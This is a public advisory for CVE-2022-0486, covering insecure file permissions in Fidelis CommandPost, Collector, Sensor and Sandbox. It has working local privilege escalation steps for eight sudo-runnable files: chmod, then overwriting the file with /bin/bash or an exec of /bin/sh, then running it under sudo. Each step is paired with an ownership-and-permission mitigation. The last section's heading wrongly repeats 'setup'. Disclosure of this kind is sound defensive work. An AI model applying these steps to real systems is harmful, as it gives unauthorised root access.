# Fidelis Network and Deception - CVE-2022-0486 - Insecure File Permissions Privilege Escalation - Multiple
#### Releasability and Acknowledgements
All exploits were approved for public release by the United States Government. Special thanks to the servicemen and government liaisons tasked with approving the documentation for unlimited distribution. Please refer to the following OTR numbers:
* OTR-2022-00482
* OTR-2022-00483
* OTR-2022-00484
* OTR-2022-00485
* OTR-2022-00486
* OTR-2022-00488
* OTR-2022-00489
* OTR-2022-00490
#### Metadata
**Date:** 20220517 2005H UTC

**Exploit Author:** Henry Reed, The Aerospace Corporation

**Vendor Homepage:** https://fidelissecurity.com/

**Affected Versions:** 

* Fidelis CommandPost prior to 9.4.5
* Fidelis Collector prior to 9.4.5
* Fidelis Sensor prior to 9.4.5
* Fidelis Sandbox prior to 9.4.5

**Tested on:**
* Fidelis CommandPost 9.4.3
* Fidelis Collector 9.4.3
* Fidelis (Internal VM) Sensor 9.4.3 

**CVE:** [CVE-2022-0486](https://nvd.nist.gov/vuln/detail/CVE-2022-0486)

**CVE Description:** Improper file permissions in the CommandPost, Collector, Sensor, and Sandbox components of Fidelis Network and Deception enables an attacker with local, administrative access to the CLI to modify affected files and enable escalation of privileges equivalent to the root user. The vulnerability is present in Fidelis Network and Deception versions prior to 9.4.5. Patches and updates are available to address this vulnerability.

## Bottom Line Up Front
Several exploits exist under this CVE, since the CVE covers a series of improper file permissions. All exploits are due to one NOPASSWD and several password-required sudoers permissions being given to the fidelis user on binaries or scripts that the fidelis user owns, therefore allowing the fidelis user to arbitrarily modify the file. This allows for local privilege escalation.

Affected file with NOPASSWD:
* /FSS/bin/shutdown.pl 

Affected files requiring a password:
* /FSS/setup/cert_mgmt
* /FSS/bin/db_updater
* /FSS/deception-manager/bin/deception-manager
* /FSS/sbin/fssdbg.sh
* /FSS/bin/mst
* /FSS/bin/setup
* /FSS/setup/unlock_cp_user.sh

It is recommended that affected Fidelis Deception or Fidelis Network users update their software to patch this vulnerability. It is also recommended for all users, regardless of if they were affected by this vulnerability, to disable shell access to their Fidelis products after initial configuration. 

If, for some reason, either of these is not possible, a mitigation for each vulnerable file is described in this document. To the extent of the author's testing, it appears that users will need to use one of these vulnerabilities to escalate privileges before they are able to apply the mitigations described, so updating Fidelis and disabling SSH is strongly recommended, instead.

## Shutdown.pl Privilege Escalation
**Tested on:**
* Fidelis CommandPost 9.4.3
* Fidelis Collector 9.4.3
* Fidelis (Internal VM) Sensor 9.4.3 

#### Summary:
Misconfigured ownership permissions on /FSS/bin/shutdown.pl allow the fidelis user to escalate privileges equivalent to the root user in multiple Fidelis products. By default, the sudoers configuration allows the fidelis user to execute /FSS/bin/shutdown.pl as the root user without prompting for a password. The file is owned by the fidelis user, allowing the fidelis user to arbitrarily modify the script and escalate privileges.

#### Exploit:
1. Change permissions to allow modification of the shutdown.pl file:
```bash
$ chmod 700 /FSS/bin/shutdown.pl
```
2. Change the file as needed to execute arbitrary code or, in this example, spawn a shell:
```bash
$ echo '#!/usr/bin/perl -w' > /FSS/bin/shutdown.pl
$ echo "exec '/bin/sh';" >> /FSS/bin/shutdown.pl
$ cat /FSS/bin/shutdown.pl
#!/usr/bin/perl -w
exec '/bin/sh';
```
3. Launch the file using the sudo command
```bash
$ sudo /FSS/bin/shutdown.pl
```

Screenshot showcasing vulnerability discovery and exploitation. Note the NOPASSWD line, which indicates that shutdown.pl is a potential candidate for privilege escalation:

![](images/shutdown.pl.png)

#### Mitigation:
Changing the user and group owners of /FSS/bin/shutdown.pl to root:fidelis and only allowing read and execute permissions to the group owner of /FSS/bin/shutdown.pl would mitigate this vulnerability:

![](images/shutdown.pl_mitigation.png)

## cert_mgmt Authenticated Privilege Escalation
**Tested on:**
* Fidelis CommandPost 9.4.3
* Fidelis Collector 9.4.3
* Fidelis (Internal VM) Sensor 9.4.3 

#### Summary:
Misconfigured ownership permissions on /FSS/setup/cert_mgmt allow the fidelis user to escalate privileges equivalent to the root user in multiple Fidelis products. By default, the sudoers configuration allows the fidelis user to execute /FSS/setup/cert_mgmt as the root user if a password is supplied. The file is owned by the fidelis user, allowing the fidelis user to arbitrarily modify the script and escalate privileges.

#### Exploit:
1. Change permissions to allow modification of the cert_mgmt file:
```bash
$ chmod u+w /FSS/setup/cert_mgmt
```
2. Change the file as needed to execute arbitrary code or, in this example, spawn a shell:
```bash
$ cp /bin/bash /FSS/setup/cert_mgmt
```
3. Launch the file using the sudo command and authenticate with the fidelis user password:
```bash
$ sudo /FSS/setup/cert_mgmt
```

Screenshot showcasing vulnerability discovery and exploitation:

![](images/cert_mgmt.png)

#### Mitigation:
Changing the user and group owners of /FSS/setup/cert_mgmt to root:fidelis and only allowing read and execute permissions to the group owner of /FSS/setup/cert_mgmt would mitigate this vulnerability:

![](images/cert_mgmt_mitigation.png)

## db_updater Authenticated Privilege Escalation
**Tested on:**
* Fidelis CommandPost 9.4.3

#### Summary:
Misconfigured ownership permissions on /FSS/bin/db_updater allow the fidelis user to escalate privileges equivalent to the root user in Fidelis CommandPost. By default, the sudoers configuration allows the fidelis user to execute /FSS/bin/db_updater as the root user if a password is supplied. The file is owned by the fidelis user, allowing the fidelis user to arbitrarily modify the binary and escalate privileges.

#### Exploit:
1. Change permissions to allow modification of the db_updater file:
```bash
$ chmod u+w /FSS/bin/db_updater
```
2. Change the file as needed to execute arbitrary code or, in this example, spawn a shell:
```bash
$ cp /bin/bash /FSS/bin/db_updater
```
3. Launch the file using the sudo command and authenticate with the fidelis user password:
```bash
$ sudo /FSS/bin/db_updater
```

![](images/db_updater.png)

#### Mitigation:
Changing the user and group owners of /FSS/bin/db_updater to root:fidelis and only allowing read and execute permissions to the group owner of /FSS/bin/db_updater would mitigate this vulnerability:

![](images/db_updater_mitigation.png)

## deception-manager Authenticated Privilege Escalation
**Tested on:**
* Fidelis CommandPost 9.4.3

#### Summary:
Misconfigured ownership permissions on /FSS/deception-manager/bin/deception-manager allow the fidelis user to escalate privileges equivalent to the root user in Fidelis CommandPost. By default, the sudoers configuration allows the fidelis user to execute /FSS/deception-manager/bin/deception-manager as the root user if a password is supplied. The file is owned by the fidelis user, allowing the fidelis user to arbitrarily modify the binary and escalate privileges.

#### Exploit:
1. Change the file as needed to execute arbitrary code or, in this example, spawn a shell:
```bash
$ cp /bin/bash /FSS/deception-manager/bin/deception-manager
```
2. Launch the file using the sudo command and authenticate with the fidelis user password:
```bash
$ sudo /FSS/deception-manager/bin/deception-manager
```

Screenshot showcasing vulnerability discovery and exploitation:

![](images/deception-manager.png)

#### Mitigation:
Changing the user and group owners of /FSS/deception-manager/bin/deception-manager to root:fidelis and only allowing read and execute permissions to the group owner of /FSS/deception-manager/bin/deception-manager would mitigate this vulnerability:

![](images/deception-manager_mitigation.png)

## fssdbg.sh Authenticated Privilege Escalation
**Tested on:**
* Fidelis CommandPost 9.4.3
* Fidelis Collector 9.4.3
* Fidelis (Internal VM) Sensor 9.4.3 

#### Summary:
Misconfigured ownership permissions on /FSS/sbin/fssdbg.sh allow the fidelis user to escalate privileges equivalent to the root user in multiple Fidelis products. By default, the sudoers configuration allows the fidelis user to execute /FSS/sbin/fssdbg.sh as the root user if a password is supplied. The file is owned by the fidelis user, allowing the fidelis user to arbitrarily modify the script and escalate privileges.

#### Exploit:
1. Change permissions to allow modification of the fssdbg.sh file:
```bash
$ chmod u+w /FSS/sbin/fssdbg.sh
```
2. Change the file as needed to execute arbitrary code or, in this example, spawn a shell:
```bash
$ cp /bin/bash /FSS/sbin/fssdbg.sh
```
3. Launch the file using the sudo command and authenticate with the fidelis user password:
```bash
$ sudo /FSS/sbin/fssdbg.sh
```

Screenshot showcasing vulnerability discovery and exploitation:

![](images/fssdbg.sh.png)

#### Mitigation:
Changing the user and group owners of /FSS/sbin/fssdbg.sh to root:fidelis and only allowing read and execute permissions to the group owner of /FSS/sbin/fssdbg.sh would mitigate this vulnerability:

![](images/fssdbg.sh_mitigation.png)

## mst Authenticated Privilege Escalation
**Tested on:**
* Fidelis CommandPost 9.4.3
* Fidelis Collector 9.4.3
* Fidelis (Internal VM) Sensor 9.4.3 

#### Summary:
Misconfigured ownership permissions on /FSS/bin/mst allow the fidelis user to escalate privileges equivalent to the root user in multiple Fidelis products. By default, the sudoers configuration allows the fidelis user to execute /FSS/bin/mst as the root user if a password is supplied. The file is owned by the fidelis user, allowing the fidelis user to arbitrarily modify the binary and escalate privileges.

#### Exploit:
1. Change permissions to allow modification of the mst file:
```bash
$ chmod u+w /FSS/bin/mst
```
2. Change the file as needed to execute arbitrary code or, in this example, spawn a shell:
```bash
$ cp /bin/bash /FSS/bin/mst
```
3. Launch the file using the sudo command and authenticate with the fidelis user password:
```bash
$ sudo /FSS/bin/mst
```

Screenshot showcasing vulnerability discovery and exploitation:

![](images/mst.png)

#### Mitigation:
Changing the user and group owners of /FSS/bin/mst to root:fidelis and only allowing read and execute permissions to the group owner of /FSS/bin/mst would mitigate this vulnerability. The following is a screenshot showcasing the privilege escalation mitigation and a snippet of the mst command output when run by fidelis without sudo:

![](images/mst_mitigation_1.png)

Screenshot showcasing that even with the mitigation, the command can still be run as sudo by the fidelis user:

![](images/mst_mitigation_2.png)

Screenshot showing that mst cannot be modified to run other arbitrary code when the mitigation is used:

![](images/mst_mitigation_3.png)

## setup Authenticated Privilege Escalation
**Tested on:**
* Fidelis CommandPost 9.4.3
* Fidelis Collector 9.4.3
* Fidelis (Internal VM) Sensor 9.4.3 

#### Summary:
Misconfigured ownership permissions on /FSS/bin/setup allow the fidelis user to escalate privileges equivalent to the root user in multiple Fidelis products. By default, the sudoers configuration allows the fidelis user to execute /FSS/bin/setup as the root user if a password is supplied. The file is owned by the fidelis user, allowing the fidelis user to arbitrarily modify the binary and escalate privileges.

#### Exploit:
1. Change permissions to allow modification of the setup file:
```bash
$ chmod u+w /FSS/bin/setup
```
2. Change the file as needed to execute arbitrary code or, in this example, spawn a shell:
```bash
$ cp /bin/bash /FSS/bin/setup
```
3. Launch the file using the sudo command and authenticate with the fidelis user password:
```bash
$ sudo /FSS/bin/setup
```

Screenshot showcasing vulnerability discovery and exploitation:

![](images/setup.png)

#### Mitigation:
Changing the user and group owners of /FSS/bin/setup to root:fidelis and only allowing read and execute permissions to the group owner of /FSS/bin/setup would mitigate this vulnerability:

![](images/setup_mitigation.png)

## setup Authenticated Privilege Escalation
**Tested on:**
* Fidelis CommandPost 9.4.3
* Fidelis Collector 9.4.3
* Fidelis (Internal VM) Sensor 9.4.3 

#### Summary:
Misconfigured ownership permissions on /FSS/setup/unlock_cp_user.sh allow the fidelis user to escalate privileges equivalent to the root user in multiple Fidelis products. By default, the sudoers configuration allows the fidelis user to execute /FSS/setup/unlock_cp_user.sh as the root user if a password is supplied. The file is owned by the fidelis user, allowing the fidelis user to arbitrarily modify the script and escalate privileges.

#### Exploit:
1. Change permissions to allow modification of the unlock_cp_user.sh file:
```bash
$ chmod u+w /FSS/setup/unlock_cp_user.sh
```
2. Change the file as needed to execute arbitrary code or, in this example, spawn a shell:
```bash
$ cp /bin/bash /FSS/setup/unlock_cp_user.sh
```
3. Launch the file using the sudo command and authenticate with the fidelis user password:
```bash
$ sudo /FSS/setup/unlock_cp_user.sh
```

Screenshot showcasing vulnerability discovery and exploitation:

![](images/unlock_cp_user.sh.png)

#### Mitigation:
Changing the user and group owners of /FSS/setup/unlock_cp_user.sh to root:fidelis and only allowing read and execute permissions to the group owner of /FSS/setup/unlock_cp_user.sh would mitigate this vulnerability:

![](images/unlock_cp_user.sh_mitigation.png)
